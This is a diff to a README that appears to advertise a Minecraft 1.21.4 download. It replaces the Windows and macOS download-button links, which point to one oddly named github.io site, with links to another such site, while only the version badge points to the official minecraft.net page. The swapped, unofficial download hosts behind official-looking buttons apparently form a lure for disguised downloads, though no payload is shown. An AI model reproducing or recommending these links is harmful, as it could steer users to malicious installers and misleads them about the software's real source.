@@ -2,8 +2,8 @@
 
 <p align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://laplaplaplas.github.io/download/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hornbladesmanhonor.github.io/download-win/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
 [![LATEST VERSION](https://img.shields.io/badge/VERSION-1.21.4-FF6B35?style=for-the-badge)](https://www.minecraft.net/en-us/download)
 [![STATUS](https://img.shields.io/badge/STATUS-ACTIVE-00c853?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/PLATFORM-WIN%20%7C%20MAC%20%7C%20LINUX-FF6B35?style=for-the-badge)]()
